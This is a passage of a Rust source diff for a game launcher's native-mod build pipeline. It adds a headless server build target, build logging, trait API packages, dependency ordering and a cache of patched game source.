@@ -25,7 +25,11 @@ use std::io::{BufRead, BufReader, Write};
 use std::path::{Path, PathBuf};
 use std::process::{Command, Stdio};
 
+mod api;
 mod crates;
+mod dependencies;
+mod inject;
+mod inject_cache;
 
 const PREFIX: &str = "native-";
 /// horizon-mixins, for bundles that don't name the revision they were tested with.
@@ -73,6 +77,55 @@ impl Profile {
     }
 }
 
+/// What a native build compiles: the game the player plays, or the headless engine a dedicated
+/// server runs (`horizon-engine`, docs/server.md). Both build the same source with the same
+/// mixins. The server uses `--no-default-features` (no audio or controllers), a separate cache,
+/// and a standalone runtime folder outside the managed versions.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+pub enum Target {
+    /// The game: `horizon-client` as the release ships it.
+    #[default]
+    Client,
+    /// The headless engine: the same binary without the default features, installed and
+    /// exported as `horizon-engine`.
+    Server,
+}
+
+impl Target {
+    pub fn name(self) -> &'static str {
+        match self {
+            Self::Client => "client",
+            Self::Server => "server",
+        }
+    }
+
+    /// What the build compiles with besides the profile, in its key: the game the release's own
+    /// features, the engine `--no-default-features` (the `mods` feature is added to both when
+    /// the source has it, so it changes neither key).
+    fn features(self) -> &'static str {
+        match self {
+            Self::Client => FEATURES,
+            Self::Server => "--no-default-features",
+        }
+    }
+
+    fn directory(self, version: &str) -> PathBuf {
+        match self {
+            Self::Client => backend::version_dir(version),
+            Self::Server => root().join("server-builds").join(version),
+        }
+    }
+
+    /// The name the built binary is installed under: the game's own, the engine's
+    /// (`horizon-engine`, docs/server.md).
+    fn binary(self) -> String {
+        match self {
+            Self::Client => backend::CLIENT.into(),
+            Self::Server => format!("horizon-engine{}", std::env::consts::EXE_SUFFIX),
+        }
+    }
+}
+
 /// What a native build was made from, kept per profile in `native/built.json` after it compiled:
 /// what the next build is compared with to say what changed.
 #[derive(Clone, Debug, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
@@ -98,11 +151,12 @@ pub enum Plan {
 impl Plan {
     pub fn label(&self) -> String {
         match self {
-            Self::UpToDate => "Up to date (no build needed)".into(),
-            Self::Incremental(changes) => {
-                format!("Incremental rebuild: {}", changes.join("; "))
-            }
-            Self::First => "First build: the whole game (several minutes)".into(),
+            Self::UpToDate => tr("Up to date (no build needed)").into(),
+            Self::Incremental(changes) => trf(
+                "Incremental rebuild: {changes}",
+                &[("changes", &changes.join("; "))],
+            ),
+            Self::First => tr("First build: the whole game (several minutes)").into(),
         }
     }
 
@@ -170,17 +224,27 @@ fn read_records(path: &Path) -> std::collections::BTreeMap<String, Record> {
         .unwrap_or_default()
 }
 
-/// The last build of `profile` that compiled, if its folder in `native/target/` is still there.
-fn last_record(profile: Profile) -> Option<Record> {
+/// A build record's key in `built.json`: the profile for a game build (as it always was), the
+/// target's own name before it for a server one, so the two never read each other's record.
+fn record_key(target: Target, profile: Profile) -> String {
+    match target {
+        Target::Client => profile.name().into(),
+        Target::Server => format!("{}-{}", target.name(), profile.name()),
+    }
+}
+
+/// The last build of `target` and `profile` that compiled, if the profile's folder in
+/// `native/target/` (the compiled crates both build from) is still there.
+fn last_record(target: Target, profile: Profile) -> Option<Record> {
     if !root().join("target").join(profile.name()).is_dir() {
         return None;
     }
-    read_records(&records_path()).remove(profile.name())
+    read_records(&records_path()).remove(&record_key(target, profile))
 }
 
-fn save_record(profile: Profile, record: &Record) {
+fn save_record(target: Target, profile: Profile, record: &Record) {
     let mut all = read_records(&records_path());
-    all.insert(profile.name().into(), record.clone());
+    all.insert(record_key(target, profile), record.clone());
     if let Ok(text) = serde_json::to_vec_pretty(&all) {
         let _ = fs::write(records_path(), text);
     }
@@ -189,7 +253,7 @@ fn save_record(profile: Profile, record: &Record) {
 /// The hash of a bundle's files.
 fn mod_hash(b: &Bundle) -> Result<String, String> {
     let mut hash = Sha256::new();
-    for (name, path) in files(&b.dir)? {
+    for (name, path) in bundle_files(b)? {
         let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
         hash.update(name.as_bytes());
         hash.update((bytes.len() as u64).to_le_bytes());
@@ -291,6 +355,40 @@ pub fn log_path() -> PathBuf {
     root().join("build.log")
 }
 
+/// Makes the build log fresh for a new attempt: its folder made, the last build's log
+/// emptied. The error says why it couldn't, so the Build log page can show it instead of
+/// the old file's contents.
+pub fn clear_log() -> Result<(), String> {
+    fs::create_dir_all(root()).map_err(|e| e.to_string())?;
+    fs::write(log_path(), "").map_err(|e| format!("{}: {e}", log_path().display()))
+}
+
+/// Appends `message` (with a newline) to the build log, so a failure that happens before any
+/// command runs is still recorded.
+pub fn append_log(message: &str) -> Result<(), String> {
+    let mut log = fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(log_path())
+        .map_err(|e| format!("{}: {e}", log_path().display()))?;
+    writeln!(log, "{message}").map_err(|e| e.to_string())
+}
+
+/// Records the whole attempt, including selection or export after compilation.
+fn logged<T>(build: impl FnOnce() -> Result<T, String>) -> Result<T, String> {
+    clear_log()?;
+    let result = build();
+    match &result {
+        Ok(_) => {
+            let _ = append_log("Build completed.");
+        }
+        Err(error) => {
+            let _ = append_log(&format!("The build failed: {error}"));
+        }
+    }
+    result
+}
+
 const MANIFEST: &str = "horizon-mixin.toml";
 /// A registry download's manifest (`.hnmod`, `horizon_mods::index::native`), beside `mixins/<id>/`.
 const NATIVE_MANIFEST: &str = horizon_mods::index::native::MANIFEST;
@@ -346,6 +444,10 @@ pub struct Bundle {
     /// The native hook points' version it needs (its `.hnmod`'s `hooks`): then `horizon` is the
     /// revision it was tested on, and it builds on any with these hook points or later ones.
     pub hooks: Option<u32>,
+    /// The bundle-relative trait package folder (`[api] path`).
+    pub api: Option<String>,
+    /// True when the manifest has content for horizon-mixins.
+    pub mixins_content: bool,
 }
 
 /// The bundles in `folder`: the folder itself when it is one (a `horizon-mixin.toml`, or an
@@ -387,6 +489,9 @@ pub(crate) fn bundle_in(dir: &Path) -> Result<Option<Bundle>, String> {
         serde_json::from_str(&text).map_err(|e| format!("{}: {e}", path.display()))?;
     let field = |name: &str| native_json[name].as_str().map(str::to_owned);
     let id = field("id").ok_or_else(|| format!("{} has no id.", path.display()))?;
+    if !api::valid_id(&id) {
+        return Err(format!("{}: invalid mod id {id:?}", path.display()));
+    }
     let found = bundle(&dir.join("mixins").join(&id), field("mixins"))?;
     match (&found.horizon, field("horizon")) {
         (Some(pinned), Some(native)) if *pinned != native => Err(format!(
@@ -418,13 +523,28 @@ fn bundle(dir: &Path, mixins: Option<String>) -> Result<Bundle, String> {
     let need = |name: &str| {
         field("mod", name).ok_or_else(|| format!("{} has no [mod] {name}.", path.display()))
     };
+    let api = value
+        .get("api")
+        .map(|table| api::folder(dir, table))
+        .transpose()?;
+    let mixins_content = value
+        .keys()
+        .any(|key| !["mod", "compatibility", "api", "dependencies"].contains(&key.as_str()));
+    // Reject links before copying the bundle into the incoming folder.
+    files_with_api(dir, api.as_deref())?;
+    let id = need("id")?;
+    if !api::valid_id(&id) {
+        return Err(format!("{}: invalid mod id {id:?}", path.display()));
+    }
     Ok(Bundle {
-        id: need("id")?,
+        id,
         version: need("version")?,
         dir: dir.to_owned(),
         horizon: field("compatibility", "horizon_revision"),
         mixins,
         hooks: None,
+        api,
+        mixins_content,
     })
 }
 
@@ -706,6 +826,9 @@ pub struct About {
     pub base: String,
     /// The Horizon commit it compiled.
     pub horizon: String,
+    /// What it compiles: the game the player plays (also the only kind a `native-mods.json`
+    /// from before the target was recorded builds), or the headless engine a server runs.
+    pub target: Target,
 }
 
 /// What installed native build `version` was made from; None for any other version.
@@ -713,12 +836,22 @@ pub fn about(version: &str) -> Option<About> {
     if !is_native(version) {
         return None;
     }
-    let path = backend::version_dir(version).join("native-mods.json");
-    let json: serde_json::Value = serde_json::from_str(&fs::read_to_string(path).ok()?).ok()?;
+    about_in(&backend::version_dir(version))
+}
+
+/// The build record (`native-mods.json`) in version folder `dir`, if it parses. A build from
+/// before targets were recorded is a client one, so it still reads.
+fn about_in(dir: &Path) -> Option<About> {
+    let json: serde_json::Value =
+        serde_json::from_str(&fs::read_to_string(dir.join("native-mods.json")).ok()?).ok()?;
     let field = |name: &str| json[name].as_str().map(str::to_owned);
     Some(About {
         base: field("base")?,
         horizon: field("horizon").filter(|r| is_revision(r))?,
+        target: match field("target").as_deref() {
+            Some("server") => Target::Server,
+            _ => Target::Client,
+        },
     })
 }
 
@@ -754,7 +887,28 @@ pub fn newer_than(base: &str, installed: &[String]) -> Option<String> {
 /// Every file under `dir`, by its path relative to `dir` (with `/`), sorted. A symlink is refused:
 /// horizon-mixins refuses them too.
 fn files(dir: &Path) -> Result<Vec<(String, PathBuf)>, String> {
-    fn walk(root: &Path, dir: &Path, out: &mut Vec<(String, PathBuf)>) -> Result<(), String> {
+    files_with_api(dir, None)
+}
+
+/// Bundle files omit only the API package's Cargo build output.
+fn bundle_files(bundle: &Bundle) -> Result<Vec<(String, PathBuf)>, String> {
+    files_with_api(&bundle.dir, bundle.api.as_deref())
+}
+
+/// The API package's target folder in a canonical bundle root.
+fn api_target(root: &Path, api: Option<&str>) -> Result<Option<PathBuf>, String> {
+    api.map(|path| root.join(path).canonicalize().map(|p| p.join("target")))
+        .transpose()
+        .map_err(|e| e.to_string())
+}
+
+fn files_with_api(dir: &Path, api: Option<&str>) -> Result<Vec<(String, PathBuf)>, String> {
+    fn walk(
+        root: &Path,
+        dir: &Path,
+        skip: Option<&Path>,
+        out: &mut Vec<(String, PathBuf)>,
+    ) -> Result<(), String> {
         for entry in fs::read_dir(dir).map_err(|e| e.to_string())?.flatten() {
             let (path, kind) = (entry.path(), entry.file_type().map_err(|e| e.to_string())?);
             if kind.is_symlink() {
@@ -763,7 +917,9 @@ fn files(dir: &Path) -> Result<Vec<(String, PathBuf)>, String> {
                     path.display()
                 ));
             } else if kind.is_dir() {
-                walk(root, &path, out)?;
+                if Some(path.as_path()) != skip {
+                    walk(root, &path, skip, out)?;
+                }
             } else {
                 let relative = path.strip_prefix(root).unwrap_or(&path);
                 out.push((relative.to_string_lossy().replace('\\', "/"), path));
@@ -771,37 +927,48 @@ fn files(dir: &Path) -> Result<Vec<(String, PathBuf)>, String> {
         }
         Ok(())
     }
+    let root = dir
+        .canonicalize()
+        .map_err(|e| format!("{}: {e}", dir.display()))?;
+    let skip = api_target(&root, api)?;
     let mut out = Vec::new();
-    walk(dir, dir, &mut out)?;
+    walk(&root, &root, skip.as_deref(), &mut out)?;
     out.sort();
     Ok(out)
 }
 
 /// The installed version `bundles` built on Horizon `revision` with horizon-mixins `mixins`
-/// become: `native-<7 digits of the revision>-<12 hex digits>`.
+/// become: `native-<7 digits of the revision>-<12 hex digits>`. The two targets' keys never mix:
+/// a server build salts its hash, so it is another version than the client build of the same
+/// mods, and the client key is unchanged.
 pub fn version_for(
     revision: &str,
     mixins: &str,
     profile: Profile,
+    target: Target,
     bundles: &[Bundle],
 ) -> Result<String, String> {
     let mut hash = Sha256::new();
     for part in [
         mixins,
         profile.name(),
-        FEATURES,
+        target.features(),
         rust_toolchain::VERSION,
         revision,
     ] {
         hash.update(part.as_bytes());
         hash.update([0]);
     }
-    let mut sorted: Vec<&Bundle> = bundles.iter().collect();
-    sorted.sort_by(|a, b| a.id.cmp(&b.id));
-    for b in sorted {
+    if target == Target::Server {
+        hash.update(target.name().as_bytes());
+        hash.update([0]);
+    }
+    // bundles() reads folders in path order, which with their manifests decides trait dispatch
+    // order: hashed in that order, a different order is another build.
+    for b in bundles {
         hash.update(b.id.as_bytes());
         hash.update([0]);
-        for (name, path) in files(&b.dir)? {
+        for (name, path) in bundle_files(b)? {
             let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
             hash.update(name.as_bytes());
             hash.update((bytes.len() as u64).to_le_bytes());
@@ -840,7 +1007,13 @@ fn source_digest(bundle: &Bundle) -> Option<String> {
                 && bundle.dir == root.join("mixins").join(&bundle.id)
         })
         .unwrap_or(&bundle.dir);
-    let read: Vec<_> = files(root)
+    // An installed .hnmod keeps its archive digest for the Mods page.
+    let paths = if root == bundle.dir {
+        bundle_files(bundle)
+    } else {
+        files(root)
+    };
+    let read: Vec<_> = paths
         .ok()?
         .into_iter()
         .map(|(name, path)| Some((name, fs::read(path).ok()?)))
@@ -855,6 +1028,8 @@ pub enum Step {
     Tool,
     Source(String),
     Mixins,
+    /// A previously patched source snapshot was reused.
+    CachedMixins,
     /// Which case the build is, before anything runs.
     Plan(Plan, Profile),
     /// Crates done, the total once cargo says it, and the one just started.
@@ -895,6 +1070,7 @@ impl Step {
                 &[("revision", &revision[..7])],
             ),
             Self::Mixins => tr("Applying the mixins").into(),
+            Self::CachedMixins => tr("Reusing patched game source").into(),
             Self::Crates => tr("Checking the mods' crates against Horizon's Cargo.lock").into(),
             Self::Plan(plan, profile) => format!("{} ({})", plan.label(), profile.name()),
             Self::Compile {
@@ -903,13 +1079,22 @@ impl Step {
                 name,
                 profile,
             } => match total {
-                Some(total) => format!(
-                    "Compiling the game ({}): {done} of {total} crates, now {name}",
-                    profile.name()
+                Some(total) => trf(
+                    "Compiling the game ({profile}): {done} of {total} crates, now {name}",
+                    &[
+                        ("profile", profile.name()),
+                        ("done", &done.to_string()),
+                        ("total", &total.to_string()),
+                        ("name", name),
+                    ],
                 ),
-                None => format!(
-                    "Compiling the game ({}): {done} crates, now {name}",
-                    profile.name()
+                None => trf(
+                    "Compiling the game ({profile}): {done} crates, now {name}",
+                    &[
+                        ("profile", profile.name()),
+                        ("done", &done.to_string()),
+                        ("name", name),
+                    ],
                 ),
             },
             Self::PostBuildCompile(id) => trf("Building {name}'s post-build step", &[("name", id)]),
@@ -919,11 +1104,13 @@ impl Step {
                 secs,
                 profile,
                 plan,
-            } => format!(
-                "Built in {} ({}, {})",
-                duration_label(*secs),
-                profile.name(),
-                plan.kind()
+            } => trf(
+                "Built in {duration} ({profile}, {plan})",
+                &[
+                    ("duration", &duration_label(*secs)),
+                    ("profile", profile.name()),
+                    ("plan", tr(plan.kind())),
+                ],
             ),
         }
     }
@@ -1039,22 +1226,35 @@ fn apply(rust: &Toolchain, tool: &Path, source: &Path, mods: &Path, out: &Path) 
     cmd
 }
 
-/// The build of the game in `stage` with `profile` (game-build.yml's, for `Release`), into `target`. It starts
-/// outside any Cargo configuration of the player's ([`rust_toolchain::outside_configs`]), so only
-/// the workspace's own (`stage/.cargo/config.toml`, when it has one) applies.
-fn compile(rust: &Toolchain, stage: &Path, target: &Path, profile: Profile) -> Command {
+/// The build of the game in `stage` with `profile` (game-build.yml's, for `Release`) and
+/// `target`'s features, into `target`. It starts outside any Cargo configuration of the
+/// player's ([`rust_toolchain::outside_configs`]), so only the workspace's own
+/// (`stage/.cargo/config.toml`, when it has one) applies. A server build compiles headless:
+/// `--no-default-features` (the server build, docs/server.md), keeping the `mods` feature when
+/// the source has one.
+fn compile(
+    rust: &Toolchain,
+    stage: &Path,
+    target: Target,
+    target_dir: &Path,
+    profile: Profile,
+    package: &str,
+) -> Command {
     let mut cmd = cargo(rust, stage, "build");
     // Cargo's progress bar (units done of the total) is read from its output. Incremental
     // compilation, the `fast` profile's, is not turned off by the player's environment: the
     // toolchain's command drops `CARGO_INCREMENTAL` and `CARGO_BUILD_*`.
-    cmd.env("CARGO_TARGET_DIR", target)
+    cmd.env("CARGO_TARGET_DIR", target_dir)
         .env("CARGO_TERM_PROGRESS_WHEN", "always")
         .env("CARGO_TERM_PROGRESS_WIDTH", "100");
     cmd.args(["--locked", "--profile", profile.name()]);
+    if target == Target::Server {
+        cmd.arg("--no-default-features");
+    }
     if has_mods_feature(stage) {
         cmd.args(["--features", FEATURES]);
     }
-    cmd.args(["-p", "horizon-client", "--bin", "horizon-client"]);
+    cmd.args(["-p", package, "--bin", "horizon-client"]);
     cmd
 }
 
@@ -1077,14 +1277,30 @@ fn cargo(rust: &Toolchain, dir: &Path, subcommand: &str) -> Command {
 /// `E_CRATE_DEPENDENCY`), leaving every other package as it was: this checks that again, a crate
 /// they name must be in Horizon's lock and every package downloaded exactly as there. Then the
 /// crates are fetched, so a feature turning on a dependency the lock lacks fails here, readably.
-fn lock_crates(rust: &Toolchain, source: &Path, stage: &Path) -> Result<(), String> {
+fn lock_crates(
+    rust: &Toolchain,
+    source: &Path,
+    stage: &Path,
+    mods: &[Bundle],
+) -> Result<(), String> {
     let read = |dir: &Path| {
         let path = dir.join("Cargo.lock");
         fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))
     };
     let horizon = crates::downloaded(&read(source)?)?;
     let staged = crates::downloaded(&read(stage)?)?;
-    if let Some(why) = crates::refused(&horizon, Some(&staged), &crates::wanted(stage)?) {
+    // `wanted` reads native-crates, which API-only stages do not have.
+    let wanted = if crates::any(stage) {
+        crates::wanted(stage)?
+    } else {
+        Vec::new()
+    };
+    let api_ids: Vec<&str> = mods
+        .iter()
+        .filter(|m| m.api.is_some())
+        .map(|m| m.id.as_str())
+        .collect();
+    if let Some(why) = crates::refused(&horizon, Some(&staged), &wanted, &api_ids) {
         return Err(why);
     }
     // Only this computer's crates: the build needs no others.
@@ -1208,24 +1424,71 @@ fn sync(from: &Path, to: &Path) -> Result<(), String> {
     Ok(())
 }
 
-/// Builds `folder`'s mods on the Horizon revision they pin (else `base`'s, the installed version
-/// whose game files the build reuses: a native build's own revision when it is one, [`base_for`])
-/// and points `instance` at the build, the default one included. Returns the build's version; a
-/// build already made is used again. Mods pinning different revisions build on the newest one,
-/// with the newest horizon-mixins they name, only when the player agreed to try (`anyway`): else
-/// the error starts with [`MISMATCH`] and says which.
-pub fn build(
+/// Copy a bundle without its API package's Cargo build output.
+fn copy_bundle(bundle: &Bundle, to: &Path) -> Result<(), String> {
+    let root = bundle.dir.canonicalize().map_err(|e| e.to_string())?;
+    let skip = api_target(&root, bundle.api.as_deref())?;
+    backend::copy_dir_except(&root, to, skip.as_deref()).map_err(|e| e.to_string())
+}
+
+/// Stage only manifests horizon-mixins can apply, after trait injections are prepared.
+fn stage_mixins(mods: &[Bundle], to: &Path) -> Result<(), String> {
+    if to.exists() {
+        fs::remove_dir_all(to).map_err(|e| e.to_string())?;
+    }
+    fs::create_dir_all(to).map_err(|e| e.to_string())?;
+    for bundle in mods.iter().filter(|b| b.mixins_content) {
+        copy_bundle(bundle, &to.join(&bundle.id))?;
+    }
+    Ok(())
+}
+
+/// The `data/` of the bundles horizon-mixins doesn't apply, staged in `stage` where it stages the
+/// others' (`native-data/<mod id>/`), for `native_data!` and the mods' build steps.
+fn stage_trait_data(mods: &[Bundle], stage: &Path) -> Result<(), String> {
+    for bundle in mods.iter().filter(|b| !b.mixins_content) {
+        let data = bundle.dir.join("data");
+        if data.is_dir() {
+            let to = stage.join("native-data").join(&bundle.id);
+            backend::copy_dir(&data, &to).map_err(|e| format!("{}: {e}", to.display()))?;
+        }
+    }
+    Ok(())
+}
+
+/// What a build of `folder`'s mods came out as: the version it installed and what it did.
+#[derive(Clone, Debug)]
+struct Built {
+    version: String,
+    /// Which case the build was, said before anything ran.
+    plan: Plan,
+    /// The profile it compiled with: the chosen one, unless the source has no `[profile.fast]`.
+    profile: Profile,
+    /// How long the whole build took.
+    secs: u64,
+}
+
+/// The pipeline both targets build with ([`build`], [`build_server`]): `folder`'s mods on the
+/// Horizon revision they pin (else `base`'s, the installed version whose game files the build
+/// reuses: a native build's own revision when it is one, [`base_for`]), compiled as `target`
+/// (the game, or the headless engine) and installed as its own version,
+/// `native-<revision>-<key>` (the key hashes the revision, the mods' files, the tool's commit,
+/// the profile and the target). A build already made is used again. Mods pinning different
+/// revisions build on the newest one, with the newest horizon-mixins they name, only when the
+/// player agreed to try (`anyway`): else the error starts with [`MISMATCH`] and says which.
+/// Nothing of the player's outside the launcher's data is touched: no instance is edited and
+/// no version selected here.
+fn pipeline(
     base: &str,
     folder: &Path,
-    instance: &Instance,
     anyway: bool,
     profile: Profile,
-    progress: impl Fn(Step),
-) -> Result<String, String> {
+    target: Target,
+    progress: &impl Fn(Step),
+) -> Result<Built, String> {
     let started = std::time::Instant::now();
     backend::need_prepared(base)?;
     fs::create_dir_all(root()).map_err(|e| e.to_string())?;
-    let _ = fs::write(log_path(), "");
     // The mods are copied first: the build and its key use the copy, whatever happens to the
     // folder meanwhile.
     let incoming = root().join("mods.incoming");
@@ -1234,8 +1497,12 @@ pub fn build(
     // A native build starts from the release or Nightly it was made from, on its own revision.
     let built_on = about(base);
     let origin = built_on.as_ref().map_or(base, |a| a.base.as_str());
+    let mut ids = std::collections::HashSet::new();
     for b in &found {
-        backend::copy_dir(&b.dir, &incoming.join(&b.id)).map_err(|e| e.to_string())?;
+        if !ids.insert(&b.id) {
+            return Err(format!("Duplicate native mod id {:?}.", b.id));
+        }
+        copy_bundle(b, &incoming.join(&b.id))?;
     }
     // Read before `repin` rewrites a copy's manifest.
     let digests: std::collections::HashMap<String, Option<String>> = found
@@ -1249,6 +1516,29 @@ pub fn build(
             ..b
         })
         .collect();
+    let declared: Vec<Vec<dependencies::Dependency>> = mods
+        .iter()
+        .map(|bundle| {
+            let path = bundle.dir.join(MANIFEST);
+            let text = fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))?;
+            let table: toml::Table = text
+                .parse()
+                .map_err(|e| format!("{}: {e}", path.display()))?;
+            dependencies::parse(&bundle.id, table.get("dependencies")).map_err(|e| e.to_string())
+        })
+        .collect::<Result<_, String>>()?;
+    let inputs: Vec<_> = mods
+        .iter()
+        .zip(&declared)
+        .map(|(bundle, deps)| dependencies::Mod {
+            id: &bundle.id,
+            version: &bundle.version,
+            has_api: bundle.api.is_some(),
+            dependencies: deps,
+        })
+        .collect();
+    let resolution = dependencies::resolve(&inputs).map_err(|e| e.to_string())?;
+    let ordered: Vec<Bundle> = resolution.order.iter().map(|&i| mods[i].clone()).collect();
     // A mod naming a hook points' version doesn't pin: it follows the others, else the game.
     let pins: Vec<Bundle> = mods.iter().filter(|b| b.hooks.is_none()).cloned().collect();
     let free = pins.iter().all(|b| b.horizon.is_none());
@@ -1278,7 +1568,9 @@ pub fn build(
     // Said with a failure: a mod made for another revision may not apply or compile on this one.
     let blame = |e: String| {
         match &other {
-        Some(list) => format!("{e}\n\nSome mods were made for other Horizon versions ({list}), which may be why. Install versions made for the same Nightly."),
+        Some(list) => format!(
+            "{e}\n\nSome mods were made for other Horizon versions ({list}), which may be why. Install versions made for the same Nightly."
+        ),
         None => e,
     }
     };
@@ -1290,7 +1582,7 @@ pub fn build(
         Some(MIXINS_REV),
         |r| committed("horizon-rust/horizon-mixins", r),
     )?;
-    let version = version_for(&revision, &mixins, profile, &mods)?;
+    let version = version_for(&revision, &mixins, profile, target, &mods)?;
     let now = Record {
         horizon: revision.clone(),
         mixins: mixins.clone(),
@@ -1299,41 +1591,102 @@ pub fn build(
             .map(|m| Ok((m.id.clone(), mod_hash(m)?)))
             .collect::<Result<_, String>>()?,
     };
-    let exists = backend::installed().contains(&version);
-    let plan = classify(exists, last_record(profile).as_ref(), &now);
+    let exists = target.directory(&version).join(".installed").is_file();
+    let plan = classify(exists, last_record(target, profile).as_ref(), &now);
     progress(Step::Plan(plan.clone(), profile));
+    let mut built = Built {
+        version: version.clone(),
+        plan: plan.clone(),
+        profile,
+        secs: 0,
+    };
     if !exists {
-        rust_toolchain::linker()?;
+        match target {
+            // The headless build links none of the sound or controller libraries: it needs
+            // only a C compiler and the C library's headers ([`rust_toolchain::linker_server`]).
+            Target::Client => rust_toolchain::linker()?,
+            Target::Server => rust_toolchain::linker_server()?,
+        }
         let rust = rust_toolchain::install(|f| progress(Step::Rust(f)))?;
-        let tool = tool(&rust, &mixins, &progress)?;
+        let needs_mixins = mods.iter().any(|m| m.mixins_content);
         progress(Step::Source(revision.clone()));
         let source = source(&revision)?;
-        progress(Step::Mixins);
         // `root()` is already the form horizon-mixins and MinGW take: resolved (no link, which
         // it refuses) and, on Windows, ASCII (which they can't read past), both by build_dir.
         let real = root();
         let fresh = real.join("stage.new");
         let _ = fs::remove_dir_all(&fresh);
-        run(
-            apply(&rust, &tool, &source, &incoming, &fresh),
-            "horizon-mixins",
-            |_| {},
-        )
-        .map_err(blame)?;
+        if needs_mixins {
+            let key = inject_cache::key(&revision, &mixins, profile, &ordered)?;
+            let snapshot = inject_cache::snapshot(&real, &key);
+            if snapshot.is_dir() {
+                progress(Step::CachedMixins);
+                sync(&snapshot, &fresh)?;
+            } else {
+                let injections = inject::prepare(&ordered, &source)?;
+                let tool = tool(&rust, &mixins, &progress)?;
+                let mixin_input = real.join("mixins.incoming");
+                stage_mixins(&ordered, &mixin_input)?;
+                progress(Step::Mixins);
+                let result = run(
+                    apply(&rust, &tool, &source, &mixin_input, &fresh),
+                    "horizon-mixins",
+                    |_| {},
+                );
+                let _ = fs::remove_dir_all(&mixin_input);
+                result.map_err(blame)?;
+                inject::stage(&fresh, &injections)?;
+                let parent = snapshot.parent().ok_or("invalid cache path")?;
+                fs::create_dir_all(parent).map_err(|e| e.to_string())?;
+                let partial = parent.join(format!(".{key}.partial"));
+                let _ = fs::remove_dir_all(&partial);
+                sync(&fresh, &partial)?;
+                fs::rename(&partial, &snapshot).map_err(|e| e.to_string())?;
+            }
+            inject_cache::touch_and_prune(&real, &key)?;
+        } else {
+            sync(&source, &fresh)?;
+        }
+        stage_trait_data(&mods, &fresh)?;
+        if mods.iter().any(|m| m.api.is_some()) {
+            // Offline metadata resolves all targets, including packages not fetched for this host.
+            let mut fetch = cargo(&rust, &source, "fetch");
+            fetch.arg("--locked");
+            run(fetch, "Downloading Horizon's crates", |_| {})?;
+        }
+        let has_api = api::stage(&fresh, &mods, &declared, &resolution)?;
+        if has_api {
+            // Add path packages to Cargo.lock before the locked dependency check.
+            let mut metadata = cargo(&rust, &fresh, "metadata");
+            metadata.args(["--offline", "--format-version", "1"]);
+            run(metadata, "Resolving trait mod crates", |_| {})?;
+        }
         // Absolute: the compiler runs from elsewhere (`compile`).
         let stage = real.join("stage");
         sync(&fresh, &stage)?;
         let _ = fs::remove_dir_all(&fresh);
-        if crates::any(&stage) {
+        if crates::any(&stage) || has_api {
             progress(Step::Crates);
-            lock_crates(&rust, &source, &stage)?;
+            lock_crates(&rust, &source, &stage, &mods)?;
         }
-        let target = real.join("target");
+        let target_dir = real.join("target");
         // A revision without `[profile.fast]` builds with `release`: the build says so.
-        let profile = profile_of(&stage, profile);
+        let compiled = profile_of(&stage, profile);
+        built.profile = compiled;
         let (mut crates, mut total, mut name) = (0, None, String::new());
         run(
-            compile(&rust, &stage, &target, profile),
+            compile(
+                &rust,
+                &stage,
+                target,
+                &target_dir,
+                compiled,
+                if has_api {
+                    api::PACKAGE
+                } else {
+                    "horizon-client"
+                },
+            ),
             "Compiling the game",
             |line| {
                 for event in parse_cargo(line) {
@@ -1352,24 +1705,27 @@ pub fn build(
                             done: crates,
                             total,
                             name: name.clone(),
-                            profile,
+                            profile: compiled,
                         });
                     }
                 }
             },
         )
         .map_err(|e| blame(crates::locked(e)))?;
-        save_record(profile, &now);
-        // Out of `target` before any post-build bin is built there (`post_build_programs`).
-        let binary = real.join("programs").join(backend::CLIENT);
-        copy_out(&target.join(profile.name()).join(backend::CLIENT), &binary)?;
+        save_record(target, profile, &now);
+        // Out of `target_dir` before any post-build bin is built there (`post_build_programs`).
+        let binary = real.join("programs").join(target.binary());
+        copy_out(
+            &target_dir.join(compiled.name()).join(backend::CLIENT),
+            &binary,
+        )?;
         let post = post_build_programs(
             &rust,
             &stage,
-            &target,
+            &target_dir,
             &real.join("programs").join("post-build"),
-            profile,
-            &progress,
+            compiled,
+            progress,
         )?;
         progress(Step::Install);
         let about = serde_json::json!({
@@ -1378,14 +1734,15 @@ pub fn build(
             "horizon_mixins": mixins,
             "hooks": mods.iter().find_map(|m| m.hooks),
             "rust": rust_toolchain::VERSION,
-            "profile": profile.name(),
+            "profile": compiled.name(),
+            "target": target.name(),
             "mods": mods.iter().map(|m| serde_json::json!({
                 "id": m.id,
                 "version": m.version,
                 "sha256": digests.get(&m.id).cloned().flatten(),
             })).collect::<Vec<_>>(),
         });
-        install(base, &version, &binary, &about, |dir| {
+        install(base, &version, target, &binary, &about, |dir| {
             for (step, program) in &post {
                 progress(Step::PostBuild(step.mod_id.clone()));
                 let cmd = crates::post_build(program, step, dir, &real.join("cache"), &stage)?;
@@ -1396,19 +1753,177 @@ pub fn build(
         let _ = fs::remove_dir_all(real.join("programs"));
     } else {
         // Used again: it counts as the newest of the builds kept (`prune`).
-        let _ = fs::write(backend::version_dir(&version).join(".installed"), "");
+        let _ = fs::write(target.directory(&version).join(".installed"), "");
     }
-    instances::edit(&instance.id, |meta| meta.version = Some(version.clone()))?;
-    prune(&version);
     let _ = fs::remove_dir_all(&incoming);
-    if plan != Plan::UpToDate {
-        progress(Step::Done {
-            secs: started.elapsed().as_secs(),
-            profile,
-            plan,
-        });
+    built.secs = started.elapsed().as_secs();
+    Ok(built)
+}
+
+/// Builds `folder`'s mods on the Horizon revision they pin (else `base`'s, the installed version
+/// whose game files the build reuses: a native build's own revision when it is one, [`base_for`])
+/// and points `instance` at the build, the default one included. Returns the build's version; a
+/// build already made is used again. Mods pinning different revisions build on the newest one,
+/// with the newest horizon-mixins they name, only when the player agreed to try (`anyway`): else
+/// the error starts with [`MISMATCH`] and says which.
+pub fn build(
+    base: &str,
+    folder: &Path,
+    instance: &Instance,
+    anyway: bool,
+    profile: Profile,
+    progress: impl Fn(Step),
+) -> Result<String, String> {
+    logged(|| {
+        let built = pipeline(base, folder, anyway, profile, Target::Client, &progress)?;
+        instances::edit(&instance.id, |meta| {
+            meta.version = Some(built.version.clone())
+        })?;
+        prune(&built.version);
+        if built.plan != Plan::UpToDate {
+            progress(Step::Done {
+                secs: built.secs,
+                profile: built.profile,
